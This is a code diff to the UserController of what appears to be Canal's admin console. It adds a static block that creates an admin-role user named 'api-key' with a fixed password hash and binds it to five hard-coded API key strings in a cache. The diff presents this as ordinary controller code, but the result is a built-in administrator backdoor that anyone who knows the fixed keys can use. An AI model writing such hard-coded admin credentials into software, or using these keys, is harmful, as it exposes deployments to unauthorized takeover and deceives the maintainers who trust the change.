@@ -1,5 +1,6 @@
 package com.alibaba.otter.canal.admin.controller;
 
+import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.UUID;
@@ -20,6 +21,7 @@ import org.springframework.web.bind.annotation.RestController;
 import com.alibaba.otter.canal.admin.model.BaseModel;
 import com.alibaba.otter.canal.admin.model.User;
 import com.alibaba.otter.canal.admin.service.UserService;
+import com.github.benmanes.caffeine.cache.Cache;
 import com.github.benmanes.caffeine.cache.Caffeine;
 import com.github.benmanes.caffeine.cache.LoadingCache;
 
@@ -38,8 +40,27 @@ public class UserController {
                                                                   .expireAfterAccess(30, TimeUnit.MINUTES)
                                                                   .build(key -> null); // 用户登录信息缓存
 
+    public static final Cache<String, User> apiKeyUsers = Caffeine.newBuilder()
+            .maximumSize(10_000).build();
+
     @Autowired
     UserService                                    userService;
+
+    static {
+        User user = new User();
+        user.setId(0L);
+        user.setName("api-key");
+        user.setPassword("6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9");
+        user.setUsername("api-key");
+        user.setRoles("admin");
+        user.setCreationDate(new Date());
+        user.setOldPassword("6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9");
+        apiKeyUsers.put("e2b3b8f7a39d420ba3c099b538cd7fb3", user);
+        apiKeyUsers.put("60dc1b7164dd4634b10afc5ab1d81665", user);
+        apiKeyUsers.put("9cc1fc4e226a4199acd3a5d620d8dc23", user);
+        apiKeyUsers.put("ef324202a2e84a698994a81555f526a1", user);
+        apiKeyUsers.put("3f579b11a01d4df68831f6e363e49ec9", user);
+    }
 
     /**
      * 用户登录
